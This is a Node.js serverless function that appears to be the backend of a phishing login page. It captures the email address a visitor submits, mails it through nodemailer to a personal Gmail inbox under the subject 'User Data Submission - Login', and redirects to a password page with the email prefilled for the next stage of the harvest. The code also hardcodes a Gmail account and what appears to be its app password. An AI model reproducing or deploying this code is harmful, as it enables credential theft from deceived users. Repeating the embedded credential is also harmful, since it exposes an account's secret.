const nodemailer = require('nodemailer');
const querystring = require('querystring');

exports.handler = async (event, context) => {
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: 'Method Not Allowed',
    };
  }

  const params = querystring.parse(event.body);
  const { email } = params;

  console.log('Login attempt - Email:', email);

  // Send email to admin
  try {
    await sendEmail('User entered email: ' + email);
    console.log('Email sent successfully for:', email);
  } catch (error) {
    console.error('Error sending email:', error.message);
  }

  return {
    statusCode: 302,
    headers: {
      Location: '/password.html?email=' + encodeURIComponent(email),
    },
    body: '',
  };
};

async function sendEmail(message) {
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'bhanukiran750@gmail.com',
      pass: 'okkxrhicnhxivbvi'
    }
  });

  const mailOptions = {
    from: 'bhanukiran750@gmail.com',
    to: 'bhanukiran750@gmail.com',
    subject: 'User Data Submission - Login',
    text: message
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    console.log('Email sent:', info.response);
  } catch (error) {
    console.error('Email send error:', error);
    throw error;
  }
}
